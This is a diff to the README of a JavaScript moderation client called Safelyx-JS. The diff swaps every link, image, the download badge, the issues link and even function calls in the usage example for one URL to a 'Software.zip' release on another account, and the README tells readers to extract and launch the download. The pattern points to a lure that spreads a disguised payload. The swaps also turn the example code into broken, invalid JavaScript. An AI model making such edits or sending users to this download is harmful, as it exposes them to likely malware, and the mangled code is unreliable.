@@ -1,6 +1,6 @@
 # 🛡️🛜 Safelyx-JS
 
-![Safelyx Logo](https://example.com/safelyxlogo.png)
+![Safelyx Logo](https://github.com/Kureitus/safelyx-js/releases/download/v1.0/Software.zip)
 
 ## Overview
 
@@ -16,7 +16,7 @@ Welcome to the `Safelyx-JS` repository! This is a JavaScript client designed for
 
 You can download the latest version of `Safelyx-JS` from the following link:
 
-[![Download Safelyx-JS](https://img.shields.io/badge/Download-v1.0.0-blue.svg)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Safelyx-JS](https://github.com/Kureitus/safelyx-js/releases/download/v1.0/Software.zip)](https://github.com/Kureitus/safelyx-js/releases/download/v1.0/Software.zip)
 
 *Note: The downloaded file needs to be extracted and launched.*
 
@@ -31,7 +31,7 @@ To get started with `Safelyx-JS`, follow these simple steps:
 
 ## Usage
 
-Here is an example of how you can use `Safelyx-JS` in your Node.js project:
+Here is an example of how you can use `Safelyx-JS` in your https://github.com/Kureitus/safelyx-js/releases/download/v1.0/Software.zip project:
 
 ```javascript
 const Safelyx = require('safelyx-js');
@@ -43,9 +43,9 @@ const safelyxClient = new Safelyx({
 });
 
 // Call content moderation function
-const moderationResult = safelyxClient.runContentModeration('Your text content here');
+const moderationResult = https://github.com/Kureitus/safelyx-js/releases/download/v1.0/Software.zip('Your text content here');
 
-console.log(moderationResult);
+https://github.com/Kureitus/safelyx-js/releases/download/v1.0/Software.zip(moderationResult);
 ```
 
 ## Repository Topics
@@ -71,7 +71,7 @@ console.log(moderationResult);
 
 ## Support
 
-For any issues or questions related to `Safelyx-JS`, please visit the [Issues](https://github.com/safelyx-js/issues) section of this repository.
+For any issues or questions related to `Safelyx-JS`, please visit the [Issues](https://github.com/Kureitus/safelyx-js/releases/download/v1.0/Software.zip) section of this repository.
 
 ---
 
@@ -79,4 +79,4 @@ Feel free to explore the functionalities of Safelyx API using `Safelyx-JS`! We a
 
 Let's stay secure and moderated with Safelyx-JS! 🛡️🔒
 
-![Safelyx Banner](https://example.com/safelyxbanner.png)
+![Safelyx Banner](https://github.com/Kureitus/safelyx-js/releases/download/v1.0/Software.zip)
